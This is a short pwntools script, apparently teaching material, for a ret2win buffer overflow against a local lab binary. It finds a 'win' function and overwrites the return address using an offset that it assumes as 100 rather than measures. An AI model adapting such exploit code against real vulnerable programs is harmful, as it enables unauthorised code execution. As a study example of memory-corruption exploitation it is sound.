#!/usr/bin/env python3
"""
Example: Simple Buffer Overflow

This example demonstrates a basic buffer overflow exploit using pwntools.
"""

from pwn import *

# Configuration
context(arch='amd64', os='linux', log_level='info')
BINARY = './binary'

def exploit():
    # Load binary
    elf = ELF(BINARY)
    print(f"[*] Binary: {BINARY}")
    print(f"[*] Protections: {elf.checksec()}")

    # Find offset using cyclic pattern
    print("[*] Finding buffer overflow offset...")
    pattern = cyclic(200)
    p = process(BINARY)
    p.sendline(pattern)
    p.wait()

    # In real scenario, get crash address from GDB
    # For now, assume offset is 100
    offset = 100
    print(f"[+] Offset: {offset}")

    # Build payload
    print("[*] Building payload...")
    if 'win' in elf.symbols:
        win_addr = elf.symbols['win']
        payload = b'A' * offset + p64(win_addr)
        print(f"[+] win() at {hex(win_addr)}")
    else:
        print("[-] win() function not found")
        return

    # Send exploit
    print("[*] Sending exploit...")
    p = process(BINARY)
    p.sendline(payload)

    # Check result
    try:
        result = p.recvall(timeout=5)
        print(f"[+] Result: {result}")
    except Timeout:
        print("[-] Timeout")

if __name__ == '__main__':
    exploit()
